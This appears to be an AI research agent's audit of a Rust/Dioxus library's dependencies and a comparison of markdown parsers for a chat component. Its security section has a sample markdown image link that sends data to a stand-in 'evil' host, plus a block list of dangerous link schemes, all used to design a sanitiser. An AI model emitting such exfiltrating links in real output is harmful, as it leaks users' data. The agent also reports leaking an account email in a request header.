> Provenance: written by a read-only research agent on 2026-10-14 (no repo edits, no builds); published as the artifact https://claude.ai/artifact/GpaybnGgtbQTtYkebbUDwp ; machine-readable companion `dependency-audit-2026-10-14.json`.

# Dependency audit + markdown for the chat kit

Date 2026-10-14, branch `claude/zealous-davinci-08se9a`. Read-only: no repo edits, no builds. Machine-readable companion: `dependency-audit-2026-10-14.json` (this directory).
Legend: **[V]** verified from source/tool output, **[E]** estimate, **[U]** unverified (needs a build or network access I did not have; GitHub API/repos are blocked in this session, crates.io works).

---

# PART A - dependency audit

## A1. What we declare

Workspace members: `primitives`, `cli` (package `shadcn-dioxus`), `preview`, `test-harness`, `dioxus-attributes`, `scripts/attr-spread-collision-checker`. Detached (own `[workspace]`): `labs/carousel-lab`, `playwright/oracle/attr-synth`. Template: `templates/starter/Cargo.toml.liquid`.

| Crate | normal | build | dev |
|---|---|---|---|
| primitives | dioxus, dioxus-attributes (path), dioxus-sdk-time 0.7, time 0.3.44 (std,macros,parsing,local-offset), num-integer 0.1.46, tracing (std), serde (derive), palette 0.7.6 | lazy-js-bundle 0.7.9 | dioxus-ssr, tokio (rt,macros,time,test-util) |
| | features: `default=[router]`, `router=[dioxus/router]`, `web=[time/wasm-bindgen]` | | |
| preview | dioxus(router), dioxus-code 0.1 (macro, lang-css), dioxus-icons 0.1, dioxus-primitives, **dioxus-i18n (git, branch bump-dioxus)**, palette, unic-langid, strum 0.27, tracing, time | dioxus, dioxus-code(runtime), dioxus-ssr, **pulldown-cmark 0.13 (default features)**, serde_json | dioxus-ssr, serde_json |
| | features: web, desktop, fullstack, server, native | | |
| cli | anyhow, clap(derive), dirs 6, serde, serde_json, toml_edit 0.25 | - | tempfile |
| dioxus-attributes (proc-macro) | dioxus-rsx, proc-macro2, quote, syn(full,extra-traits) | | |
| attr-spread-collision-checker | dioxus-rsx, proc-macro2(span-locations), syn(full,extra-traits,visit) | | |
| test-harness | dioxus 0.7.9, dioxus-primitives(router) | | |
| carousel-lab (detached) | dioxus(web), dioxus-primitives(web), js-sys, web-sys | | |
| attr-synth (detached) | dioxus(macro), dioxus-core, dioxus-primitives(web,router), dioxus-ssr, serde_json | | |
| starter template | dioxus 0.7.9, dioxus-primitives (git, default features) | | |

**What USERS pay for** (`cargoDependencies` in the 76 `preview/src/components/*/component.json`) **[V]**:

| cargoDependency | components | version spec |
|---|---|---|
| dioxus-primitives (git `MentalGear/shadcn-dioxus`) | 76 (navbar adds `features:["router"]`) | no `rev`, no tag |
| dioxus-icons | 27 | `"0.1.0"` -> caret |
| time | 2 (calendar, date_picker) | `"0.3.44"` -> caret (lock has 0.3.47) |
| palette | 1 (color_picker) | `"0.7.6"` -> caret |

npm (dev tooling only, never shipped): `playwright/package.json` -> @axe-core/playwright, @playwright/test ^1.60, axe-playwright, playwright (16 packages in lock); `preview/package.json` -> stylelint ^16.20 + config-standard, config-idiomatic-order, stylelint-order, create-stylelint (167 packages in lock).

## A2. How many crates

All via `cargo tree --offline --locked -e normal --prefix none | sort -u` (unique name+version lines, root included, so subtract 1) **[V]**:

| Scope | wasm32 | host |
|---|---|---|
| dioxus-primitives, default features + `web` | 176 | 184 |
| ... `--no-default-features --features web` (router off) | 136 | - |
| preview `--features web` | 227 (256 with build-deps) | - |
| preview `--features server` | - | 336 (346 with build-deps) |
| test-harness (dioxus web + primitives) | 186 | 203 |
| cli (`shadcn-dioxus`) | - | 38 |
| dioxus-attributes / attr-spread checker | - | 8 / 8 |

- `Cargo.lock`: **976** packages, 850 unique names, 99 names with several versions (126 extra copies), 969 registry / 6 path / **1 git** (dioxus-i18n). This is inflated by preview's `desktop`/`native`/`fullstack` features: the default-feature graph (`cargo metadata`) is 431 packages / 395 names.
- Licences over the default graph **[V]**: ~340 MIT/Apache-2.0 variants, 20 Unicode-3.0, 5 Zlib, 3 ISC, plus BSD-3, CC0, BSL-1.0 (xxhash-rust), Unlicense-or-MIT. One MPL-2.0: `option-ext` (only through `dirs`, cli). One `... OR LGPL-2.1-or-later` and one `Apache-2.0 OR GPL-2.0-only` are dual-licensed with a permissive option. No pure copyleft.

**Marginal cost of our own deps in a user's wasm tree** (primitives tree minus what `dioxus` alone brings: 176 vs 162 -> 24 crates incl. primitives itself) **[V]**:

| direct dep | exclusive crates | what |
|---|---|---|
| palette | **12** | palette, palette_derive, approx, by_address, fast-srgb8, phf 0.11 (+generator/macros/shared), rand 0.8, rand_core 0.6, siphasher |
| time | 6 | time, time-core, time-macros, deranged, num-conv, powerfmt |
| dioxus-sdk-time | 3 (+gloo-timers wasm / +tokio host, reached only via it) | sdk-time, futures, futures-executor |
| num-integer | 1 | |
| dioxus-attributes | 1 (own) | |
| tracing, serde | 0 | dioxus already brings them |
| default `router` feature | **40** | dioxus-router, url, idna, 15x icu_*/yoke/zerovec, sha2... |

So **every** primitives user, even a Button-only app, compiles ~22 third-party crates on top of dioxus; 12 of them are only for the colour picker and 6 only for the calendar/date picker.

## A3. Per-dependency verdicts

Full record in `deps.json`. Usage counts are non-comment lines in `primitives/src` + `preview/src` + `cli/src`.

| Dep | Used for (count) | Licence | Latest (date) / downloads | Pulls | Users pay? | Verdict |
|---|---|---|---|---|---|---|
| dioxus | framework | MIT/Apache | 0.7.10 (2026-07-31); lock 0.7.9 | 162 | owns | KEEP |
| dioxus-attributes | attr-spread macro, 277 lines/64 files | MIT/Apache | in-repo | 8 | yes (proc macro) | KEEP |
| dioxus-sdk-time | **`sleep` only** (7 files, 10 sites); crate 520 LOC, `sleep` is 4 lines (tokio / gloo-timers) | MIT/Apache | 0.7.0 (2025-11-06), single release, 184k dl | +3 | yes, all | REPLACE-WITH-OWN (low prio: trades 1 crate for 2 direct deps; net -3 crates; XS, <1h) |
| time | public Date/Month/Weekday type of Calendar+DatePicker | MIT/Apache | 0.3.55 (2026-08-01), 972M | +6 | yes, all (and 2 component.json) | FEATURE-GATE. `parsing` feature looks unused (no `Date::parse`/`format_description` in primitives) [U] |
| num-integer | **trait bound only** `T: Integer` on private DateSegment (1 import) | MIT/Apache | 0.1.47 | +1 | yes, all | REPLACE-WITH-OWN, XS (15-30 min) |
| tracing | 2 real `warn!` calls (rest is rustdoc) | MIT | 0.1.44 | 0 | no extra | KEEP |
| serde | JSON payloads to/from JS in 3 files | MIT/Apache | 1.0.229 | 0 | no extra | KEEP |
| palette | color_picker.rs + color_naming.rs (HSV/sRGB/Oklch); `Hsv`/`Srgb<u8>` are in ColorPicker's **public props** | MIT/Apache | 0.7.7 (2026-08-02; previous 0.7.6 was 2024-04) | **+12** | yes, all | FEATURE-GATE (primitives feature `color-picker`, color_picker/component.json adds it). Rewrite (~150-250 LOC) would break public types |
| lazy-js-bundle | build.rs bundling ONE 112-line focus-trap.ts into a committed 1-line .js | MIT/Apache | 0.7.10 | 0 | **build script in every user build** | REPLACE-WITH-OWN (drop; commit JS, add a repo gate). Reason below |
| dioxus-icons | 16 distinct Lucide icons in 25 shipped component.rs (153 preview files) | MIT AND ISC | 0.1.0 (2026-05-08), 34k dl | +1 | only with the 27 components | KEEP-PINNED. Already conditional. 1705 icon fns as static templates, so wasm should carry only used ones [E]; 24 MB of source to parse on a cold build [U cost] |
| dioxus-code | preview docs highlighting (25 lines) | MIT | 0.1.2 (2026-05-11), 9.6k dl | +21 (arborium/tree-sitter) | no | KEEP, preview only |
| dioxus-i18n | 3 demo files | MIT | **crates.io 0.6.0 (2026-10-12) now requires dioxus ^0.7**; we use git branch `bump-dioxus` @ b1dd50b (0.4.3) | +9 | no | KEEP-PINNED: move off the git branch to crates.io 0.6.0 (API compat unverified, needs a preview build) |
| unic-langid | `langid!` in preview main.rs | MIT/Apache | 0.9.6 | 0 | no | KEEP |
| strum | demo enums, 8 files | MIT | 0.28.0 (lock 0.27.2) | +3 | no | REPLACE-WITH-OWN (low prio, S) |
| pulldown-cmark (build) | preview/build.rs docs.md -> HTML, default features (getopts+html) | MIT | 0.13.4 (2026-05-20); lock 0.13.3 | +7 host | no (build-time) | KEEP-PINNED; trim to `default-features=false, features=["html"]`; bump to >=0.13.4 |
| serde_json / anyhow / clap / toml_edit / tempfile | cli + preview build | MIT/Apache | current | clap 19, rest small | no (cli is `cargo install`ed) | KEEP |
| dirs | **one call**: `cache_dir().or_else(home_dir)` (cli/src/registry.rs:121) | MIT/Apache; pulls option-ext **MPL-2.0** | 7.0.0 (lock 6.0.0) | +4 | no | REPLACE-WITH-OWN, XS (~20 LOC), removes the only MPL crate |
| dioxus-ssr / tokio | tests, SSG | MIT/Apache | current | 3 / 2 | no | KEEP |

**lazy-js-bundle risk, read from source [V]:** `build.rs` hashes `src/ts` with `std::hash::DefaultHasher` (std documents that hasher as not stable across Rust releases) and compares to the committed `src/js/hash.txt`; on mismatch it shells out to `bun` and writes into the dependency checkout. Today the hash matches so it is a no-op, but it is a build-script compile + run in every consumer build and a latent hard failure (no `bun`) if the hash ever differs. Whether it actually differs across rustc versions is [U]. Our own cli already avoids `DefaultHasher` for exactly this reason (FNV-1a in `cli/src/registry.rs`).

**Priority order if you only do three things:** (1) gate `palette` (-12 crates for all non-colour-picker users), (2) drop `lazy-js-bundle`/`build.rs`, (3) gate `time` (+ drop num-integer and optionally sdk-time). After 1-3 a Button-only app compiles ~175 -> ~157 crates on wasm [E from the exclusive counts above].

## A4. Pinning: what actually happens (source-verified)

Source: `dioxus-cli 0.7.9` `src/cli/component.rs::add_rust_dependencies` and `dioxus-component-manifest 0.7.9` `CargoDependency::add_command` (downloaded from static.crates.io; dx's own `~/.cargo/registry` copy is not present), and our `cli/src/manifest.rs::add_args` which the file says is kept identical **[V]**.

- Each `cargoDependencies` entry becomes **`cargo add <name>[@<version>] [--features a,b] [--no-default-features unless "default_features":true] [--git U] [--rev R]`**, run one at a time over a `HashSet` (unordered), in the user's crate dir. Fields: `name, version, features, default_features, git, rev`. No `tag`, `branch`, `path`.
- `version` is passed as `name@version`, so it is whatever cargo-add accepts. I tested offline in a scratch crate **[V]**: `@0.13.3` -> `"0.13.3"` (caret), `@=0.13.3` -> `"=0.13.3"` (exact), `@~0.13.3` -> `"~0.13.3"`. So **`"version": "=0.13.4"` in component.json works with no tooling change.**
- `cargo add` **rewrites an existing requirement** in the user's Cargo.toml: with `time = { version="0.3.50", features=["serde"] }` present, `cargo add time@0.3.44 --no-default-features` produced `version="0.3.44", default-features=false` (a silent downgrade of the requirement and a silent `default-features=false` on the user's own dep; the lock keeps 0.3.50 so it still builds). With `=0.3.44` it becomes an exact pin on the user's crate, which can turn into a resolver error if anything else in their tree wants a newer patch.
- The quirk `--no-default-features` is always added. Consequence for the starter template (`dioxus-primitives = { git }`, default `router` ON): the first `dx components add <x>` flips primitives to `default-features=false`, router off (40 crates) except where navbar re-adds it. Consistent with how the repo behaves today; worth knowing.
- Cargo.lock: our workspace lock does **not** reach users. The user's resolver picks the newest semver-compatible version at first `cargo add` (for `0.x` caret = patch-level only: `^0.13.3` allows 0.13.x). `scripts/registry-install-smoke.sh` also resolves fresh, not from our lock, so "what we tested" and "what ships" can differ for caret specs.
- `dioxus-primitives` is a git dep with **no `rev`**: it resolves to the default-branch HEAD at the user's first `cargo add`, while the component sources come from whatever `--git/--rev` registry checkout dx cached. Skew between primitives and copied components is possible after any later primitives change.

**Recommended policy**
1. `dioxus-primitives`: stamp `rev` (the release commit) into every component.json at release time via a script; install docs say `--git <url> --rev <same>`. (A commit cannot contain its own hash, so this is a release-step, not hand-edited.)
2. Leaf crates that only one component uses and nobody else's tree is likely to share (markdown parser, dioxus-icons): **exact `=x.y.z`**. Widely shared crates whose types appear in our API (`time`, `palette`): caret with a *floor equal to the version we test* (current: time 0.3.44 vs lock 0.3.47, palette lock 0.7.6, latest 0.7.7).
3. Add a gate `check-cargo-dep-versions.sh`: every `cargoDependencies.version` must be satisfied by (and for `=` equal to) the workspace `Cargo.lock` version, and the crate must be a workspace/preview dependency, so shipped == tested.
4. Supply chain: crates.io checksums only protect our lock; for users use exact pins plus `cargo deny` (licences/advisories/sources) and optionally `cargo vet` in this repo for the *pinned set only*; publish a `deps.json`-style table. Neither tool is installed here [U].
5. Replace the git branch dep `dioxus-i18n` with crates.io 0.6.0 (immutable) - then the lock has zero git sources.

---

# PART B - markdown for the chat kit

## B1. Candidates

Counts are from the downloaded crate sources **[V]** unless marked.

| | pulldown-cmark 0.13.4 | markdown (markdown-rs) 1.0.0 | comrak 0.56.0 |
|---|---|---|---|
| Licence | MIT | MIT | BSD-2-Clause |
| Last release / cadence | 2026-05-20; 4 releases in 12 mo (0.13.0 2025-02, 0.13.1 2026-02) | 2025-04-23; **0 releases in 12 mo**, 1.0.0 followed 7 alphas | 2026-10-06; 14 in 12 mo |
| Downloads (total) | 175M | 11.8M | 8.9M |
| Source LOC (src/) | 13.7k incl. 3.7k generated tables (entities.rs, puncttable.rs) + 0.2k CLI main -> ~9.7k parser core; +0.5k pulldown-cmark-escape | 42.5k (9.4k is unicode.rs tables) | 49.4k (19.2k is re2c-generated scanners.rs; 2.3k+ of src/tests) |
| Tests shipped | 17.7k LOC, 652 CommonMark 0.31.2 examples + GFM/extension suites | large; claims 100% CommonMark+GFM+MDX | claims CommonMark and GFM 670/670 |
| Deps, default-features off, wasm | **pulldown-cmark + bitflags + memchr + unicase = 4** (+pulldown-cmark-escape only with `html`). In a Dioxus tree bitflags and memchr already exist -> **net +1 (unicase)** | **2** (markdown + unicode-id) | ~**17**: caseless, finl_unicode, memchr-n, phf 0.14(+shared, siphasher), rustc-hash 2, smallvec, typed-arena, fearless_simd(+macros proc-macro -> syn 3, quote, proc-macro2), tinyvec, unicode-normalization... Default features pull clap/syntect/bon (never use defaults) |
| unsafe | none unless `simd` feature: `#![forbid(unsafe_code)]` | 0 | present (~690 hits, nearly all in generated scanners.rs) |
| MSRV | 1.71.1 | 1.56 | **1.89 (above our 1.80 primitives / 1.88 preview)** |
| API shape | pull parser, `Event` stream (zero-copy), `into_offset_iter` | `to_html` or mdast AST (`to_mdast`) | arena AST + HTML/CommonMark formatters |
| CommonMark | 0.31.2, 652 spec tests | 0.31.x | 0.31.x |
| GFM | tables, strikethrough, tasklists, footnotes, `ENABLE_GFM` (alerts). **No bare-URL autolink literal** (not in Options list; own pass ~50 LOC) | all GFM incl. `gfm_autolink_literal` | all GFM incl. autolink |
| Raw HTML | emits `Event::Html/InlineHtml`; renderer decides (we would never emit it) | `allow_dangerous_html` default false | `unsafe_` option default off |
| wasm32 | yes (already in this repo's build graph, build-time only) | yes | yes without default features |
| Compiled wasm size | [E] ~70-150 KB raw / ~30-60 KB gz (the 2.2k-line entity table lives inside the parser, so `html` off saves little) | [E] 150-350 KB | [E] 250-600 KB |
| Streaming support | none built in (re-parse whole text; O(n) per chunk) | none | none |

Panic note **[V]**: the 0.13.3 -> 0.13.4 diff touches only `src/parse.rs`, replacing `self.tree.cur().unwrap()` after `tree.push()` on tight paragraphs by a `None`-returning path. That looks like a panic fix reachable from input [E: inferred from the diff, no changelog in the crate]. On wasm a panic aborts the whole app, so for model-generated text **require >= 0.13.4** and add a regression/fuzz corpus of weird chat output. Our lock has 0.13.3.

Dioxus-native markdown crates on crates.io **[V]** (searches "dioxus markdown", "dioxus-markdown", "dioxus md"):
- `dioxus-markdown` 0.0.1 (2025-03): targets dioxus ^0.6, single release, 194 recent dl. No.
- `dioxus-nox-markdown` 0.13.2 (2026-03): headless editor/previewer; depends on **`dioxus =0.7.4` exact** (conflicts with our 0.7.9), plus crop, pulldown-cmark, gloo-timers; 151 dl. No.
- `markdown-dx` 0.1.0 (2026-03): bon, katex-rs, markdown, regex, toml, paste; 77 dl. No.
- `dioxus-mdx` 0.10.2 (2026-09): MDX docs framework (openapiv3, serde_yaml, hl-lite), docs-site oriented. No.
Conclusion: nothing Dioxus-native is trusted/lean enough; the ecosystem renders `pulldown-cmark` events itself.

Streaming helpers **[V]**: `mdstream` 0.3.0 (MIT OR Apache-2.0, 101k dl, 5.3k LOC, **zero default deps**, 0 unsafe, optional pulldown adapter; committed+pending block splitter and a "remend-like" pending repair with `terminate_markdown`) and `remend` 1.3.0 (MIT, Rust port of Vercel's remend, 1.6k LOC, zero deps, 21 downloads, created 2026-08). Both are good *references* for the heal pass; remend is too new to depend on.

## B2. How it would ship (mechanics verified)

- A new registry component `preview/src/components/markdown/` (`mod.rs` = `mod component; pub use component::*;`, `component.rs`, `style.css`, `component.json`) with
  `"cargoDependencies": [ {name: dioxus-primitives, git: REGISTRY_GIT_URL}, {name: "pulldown-cmark", version: "=0.13.4"} ]`.
  `message`, `bubble`, `message_scroller`, `attachment` have `cargoDependencies` = primitives only today and no `componentDependencies` on it; a user who never runs `dx components add markdown` never gets the crate. `dx components add` copies a component's whole directory plus its `componentDependencies` closure and runs `cargo add` for the closure's `cargoDependencies` only (check-installed-paths header, dx source above) **[V]**.
- `scripts/check-installed-paths.sh` already enforces the other half: every external crate a component's Rust files use must be named in its own or its closure's `cargoDependencies` (so `use pulldown_cmark::...` without the entry fails the gate), and it parses entries as objects (`c["name"]`), so keep the object form. `scripts/check-registry-url.sh` requires `git == REGISTRY_GIT_URL` for primitives only.
- **No cargo feature on dioxus-primitives is needed** as long as the parser and the renderer live in the component directory. Put only dependency-free helpers in primitives if wanted (heal pass on `&str`, `safe_href(&str) -> Option<&str>`): pure std, no new crate, reusable by any parser.
- Preview must compile the component to demo it, so `preview/Cargo.toml` gains `pulldown-cmark` as a *normal* dep (`default-features = false`; build-dep keeps its own feature set under resolver 3). That grows the docs-site wasm only.
- To make "never by default" enforceable by construction, add one gate (and list it in `run-gates.sh` + CLAUDE.md per the repo rule): `pulldown-cmark` may appear in `cargoDependencies` of an allowlisted set of components only (initially `markdown`), with a reasoned allowlist like the other checks.

## B3. Pin

Use **exact `=0.13.4`** (verified to pass through `cargo add pulldown-cmark@=0.13.4`). Trade-off **[V]**: an exact pin overwrites any existing `pulldown-cmark` requirement in the user's Cargo.toml and can conflict if another of their dependencies needs a newer 0.13.x (e.g. `mdstream` asks `^0.13.4`, fine; a future `^0.13.5` would not be). `~0.13.4` removes that conflict while still limiting to patch releases (for 0.x, `^0.13.4` is already patch-only). Recommendation: `=` for the strongest reproducibility, with the install doc noting how to relax it; revisit if users complain.
Supply chain: crates.io checksum + exact version + `cargo deny`/`cargo vet` entry for pulldown-cmark, bitflags, memchr, unicase, (pulldown-cmark-escape if `html`). `forbid(unsafe_code)` in the crate (without `simd`) makes the audit surface the logic only. RustSec history for these crates is [U] (GitHub blocked here; run `cargo audit`).

## B4. Vendor / lift vs depend vs own subset

Licence **[V]**: pulldown-cmark MIT; lifting is allowed with the copyright + permission notice retained (same family as the repo's `dev-docs/archive/fork-research/lifting-from-forks.md` section 1: attribution survives; a lifted file needs a provenance header with source + version/sha + what changed; MIT notice must ship with it). comrak BSD-2-Clause also fine; markdown-rs MIT.

| Option | Ownership cost | Size/complexity | Risks |
|---|---|---|---|
| A. Depend on pulldown-cmark `=0.13.4` (recommended) | bump pin yearly; ~4 releases/yr | +1 crate in a Dioxus tree; renderer ~250-400 LOC + heal ~150-250 LOC + tests ~500 [E] | panic fixes land upstream (see 0.13.4); GFM autolink missing (own ~50 LOC) |
| B. Vendor pulldown-cmark into the component dir | you own a CommonMark parser: ~9.7k core LOC + 3.7k generated tables + 17.7k tests (652 spec cases; spec itself moves slowly: 0.30 in 2021, 0.31.2 in Jan 2024) | users receive 13k LOC in `src/components/markdown/`, compile it in their crate (their lints, edition 2021, their clippy), duplicated if they also depend on the crate | worse supply chain story, not better: unreviewable diff, no checksum, we forgo upstream fixes. The `dx components add` copy mechanism is built for UI sources, not parsers. Reject |
| C. Own subset renderer (no crate) | paragraphs, emphasis/strong, code spans + fenced blocks, links, bullet/ordered lists (nesting), headings, blockquote, hr, (tables) | [E] 1.1-1.7k LOC production + ~1k tests; ~3-6 engineer-days to production quality | CommonMark emphasis-delimiter rules, list indentation/lazy continuation and nesting are where hand parsers break; LLM output uses tables, nested lists, task lists, HTML fragments, LaTeX; divergence from what other tools render; every bug is ours. Benefit: zero crates, ~15-30 KB wasm [E] |

Streaming "heal" pass (any option): close unterminated `**`, `*`, `_`, `` ` ``, ``` fences, `~~`, and `[text](partial-url` at the tail of the buffer before parsing (remend/mdstream `terminate_markdown` are the reference behaviours). ~150-250 LOC [E]. Re-parsing the full text per chunk is O(n) per tick; fine for chat-sized messages, and `mdstream`'s committed/pending split is the escape hatch if long outputs get slow.

**Security by construction (all options):**
- Render the event stream into Dioxus elements; never `dangerous_inner_html`. `Event::Html`/`InlineHtml` -> escaped text or dropped. Dioxus escapes text nodes.
- Links: allow only `http`, `https`, `mailto`, `tel`, relative (`/`, `#`, `?`); strip ASCII control chars/whitespace before checking the scheme (`java\tscript:`), reject `javascript:`, `vbscript:`, `data:`; add `rel="noopener noreferrer nofollow"`, `target="_blank"` only for external.
- Images: model output can exfiltrate data via `![](https://evil/?q=...)` loaded automatically. Default: do not render images (or render as a link); opt-in via an allowlist/callback prop.
- Do not enable heading-attribute / metadata extensions (id/class injection). Code blocks: plain `<pre><code class="language-x">` with a slot for a highlighter; do not pull `dioxus-code` (tree-sitter, +21 crates) by default.
- Pure functions (heal, safe_href, event->node) are unit-testable with `dioxus-ssr` as the repo already does.

## B5. Recommendation and decisions

**Recommend Option A**: new optional `markdown` registry component on `pulldown-cmark =0.13.4` (`default-features=false`, no `html`), renderer + sanitiser + heal pass in the component dir (helpers that are parser-independent may live in primitives with no new dependency), no primitives feature, gate that keeps the crate out of every other component. Reasoning: smallest trusted surface that is actually CommonMark-conformant (`forbid(unsafe)`, 652-case suite, +1 net crate in a Dioxus tree, MIT, already in our build graph and maintained), versus 1.1-1.7k LOC of hand parsing risk (C) or owning a 13k-LOC parser (B). markdown-rs is attractive on deps/AST/GFM-autolink but has had no release in 18 months [V: last 2025-04-23]; comrak is the most active but heavier (MSRV 1.89, ~17 crates, syn 3). Revisit C only if a measured wasm-size budget cannot absorb the parser (measure first: build a 20-line wasm crate with `opt-level=z, lto` and compare; I did not build anything).

Decision questions for the owner:
1. Parser: pulldown-cmark (recommended) vs own subset (C) vs markdown-rs? If C, which constructs are in scope (tables? nested lists? task lists?)?
2. Pin style in component.json: exact `=0.13.4` (recommended) or `~0.13.4`? Accept that an exact pin overwrites a user's existing requirement?
3. Images from model output: off by default (recommended), allowlist callback, or on?
4. Link policy: scheme allowlist as above; open external links in a new tab with `noopener`? Should the component expose `on_link_click` instead of letting the browser navigate?
5. Code blocks: plain `<pre><code>` + highlighter slot (recommended) vs a shipped highlighter (which one; dioxus-code costs +21 crates)?
6. Streaming: ship the heal pass inside `markdown` (recommended), or also adopt mdstream-style committed/pending blocks now?
7. Bare-URL autolinks and math: wanted? (pulldown has no autolink literal; `ENABLE_MATH` exists but needs a KaTeX-style renderer we do not have.)
8. Do we add the allowlist gate and the `check-cargo-dep-versions` gate now (needs new entries in `run-gates.sh` + the CLAUDE.md list)?
9. Part A follow-ups to schedule: gate `palette`/`time`, drop `lazy-js-bundle`, release-time `rev` stamping for primitives, move dioxus-i18n to crates.io 0.6.0.

Process note: my first crates.io request batch sent the account email in the User-Agent header by mistake; all later requests used a generic agent string.
